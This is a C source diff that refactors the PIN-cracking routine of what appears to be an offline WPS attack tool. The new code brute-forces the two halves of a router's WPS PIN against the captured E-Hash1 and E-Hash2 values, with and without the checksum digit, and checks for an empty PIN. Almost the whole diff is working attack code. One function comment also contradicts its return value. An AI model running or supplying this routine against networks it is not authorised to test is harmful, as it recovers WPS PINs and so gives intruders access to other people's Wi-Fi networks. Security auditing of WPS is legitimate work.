@@ -702,7 +702,7 @@ usage_err:
 		}
 
 		uint_fast8_t pfound = PIN_ERROR;
-		char pin[WPS_PIN_LEN + 1];
+		char pin[WPS_PIN_LEN + 1] = {0};
 		vtag_t *vtag;
 		if (decrypted5 && decrypted7 && wps->e_hash1 && wps->e_hash2) {
 			wps->e_s1 = malloc(WPS_SECRET_NONCE_LEN); if (!wps->e_s1) goto memory_err;
@@ -1488,75 +1488,63 @@ static int check_empty_pin_half(const uint8_t *es, struct global *wps, const uin
 	return !memcmp(result, ehash, WPS_HASH_LEN);
 }
 
-/* PIN cracking attempt */
-uint_fast8_t crack(struct global *g, char *pin)
+/* returns 1 if numeric pin half found, -1 if empty pin found, 0 if not found */
+static int crack_first_half(struct global *wps, char *pin)
 {
-	struct global *wps = g;
-	unsigned int first_half = 0;
-	unsigned int second_half = 0;
-	uint8_t s_pin[4];
-	char mask[5];
-	uint_fast8_t found = 0;
+	*pin = 0;
 
-	/* Check for empty pin (length = 0) */
-	if (check_empty_pin_half(wps->e_s1, wps, wps->e_hash1) && check_empty_pin_half(wps->e_s2, wps, wps->e_hash2)) {
+	if (check_empty_pin_half(wps->e_s1, wps, wps->e_hash1)) {
+		return -1;
+	}
+		
+	unsigned first_half;
 	
-		/* Empty pin detected */
-		pin[0] = '\0';
-		return 0;
-	}
-
-	/* Brute-force numeric pins */
-	while (first_half < 10000) {
-		uint_to_char_array(first_half, 4, s_pin);
-		if (!check_pin_half(s_pin, wps->psk1, wps->e_s1, wps, wps->e_hash1))
-			first_half++;
-		else
-			break;
-	}
-
-	if (first_half < 10000) { /* First half found */
-
-		/* Testing with checksum digit */
-		while (second_half < 1000) {
-			unsigned int checksum_digit = wps_pin_checksum(first_half * 1000 + second_half);
-			unsigned int c_second_half = second_half * 10 + checksum_digit;
-			uint_to_char_array(c_second_half, 4, s_pin);
-			if (!check_pin_half(s_pin, wps->psk2, wps->e_s2, wps, wps->e_hash2)) {
-				second_half++;
-			}
-			else {
-				second_half = c_second_half;
-				found = 1;
-				break;
-			}
-		}
-
-		/* Testing without checksum digit */
-		if (!found) {
-			second_half = 0;
-
-			while (second_half < 10000) {
-
-				/* If already tested skip */
-				if (wps_pin_valid(first_half * 10000 + second_half)) {
-					second_half++;
-					continue;
-				}
-
-				uint_to_char_array(second_half, 4, s_pin);
-				if (!check_pin_half(s_pin, wps->psk2, wps->e_s2, wps, wps->e_hash2)) {
-					second_half++;
-				}
-				else {
-					found = 1;
-					break;
-				}
-			}
+	for (first_half = 0; first_half < 10000; first_half++) {
+		uint_to_char_array(first_half, 4, pin);
+		if (check_pin_half(pin, wps->psk1, wps->e_s1, wps, wps->e_hash1)) {
+			pin[4] = 0; /* make sure pin string is zero-terminated */
+			return 1;
 		}
 	}
+	
+	return 0;
+}
 
-	snprintf(pin, WPS_PIN_LEN + 1, "%08u", first_half * 10000 + second_half);
+/* returns non-zero if pin found, -1 if empty pin found, 0 if not found */
+static int crack_second_half(struct global *wps, char *pin)
+{
+	if (!pin[0] && check_empty_pin_half(wps->e_s2, wps, wps->e_hash2))
+		return 1;
+		
+	unsigned second_half, first_half = atoi(pin);
+	char *s_pin = pin + strlen(pin);
+	
+	for (second_half = 0; second_half < 1000; second_half++) {
+		unsigned int checksum_digit = wps_pin_checksum(first_half * 1000 + second_half);
+		unsigned int c_second_half = second_half * 10 + checksum_digit;
+		uint_to_char_array(c_second_half, 4, s_pin);
+		if (check_pin_half(s_pin, wps->psk2, wps->e_s2, wps, wps->e_hash2))
+			return 1;
+	}
+	
+	for (second_half = 0; second_half < 10000; second_half++) {
 
-	return !found; /* 0 success, 1 failure */
+		/* If already tested skip */
+		if (wps_pin_valid(first_half * 10000 + second_half)) {
+			continue;
+		}
+
+		uint_to_char_array(second_half, 4, s_pin);
+		if (check_pin_half(s_pin, wps->psk2, wps->e_s2, wps, wps->e_hash2))
+			return 1;
+	}
+	
+	return 0;
+}
+
+/* PIN cracking attempt - returns 0 for success, 1 for failure */
+uint_fast8_t crack(struct global *wps, char *pin)
+{
+	return !(crack_first_half(wps, pin) && crack_second_half(wps, pin));
+		
 }
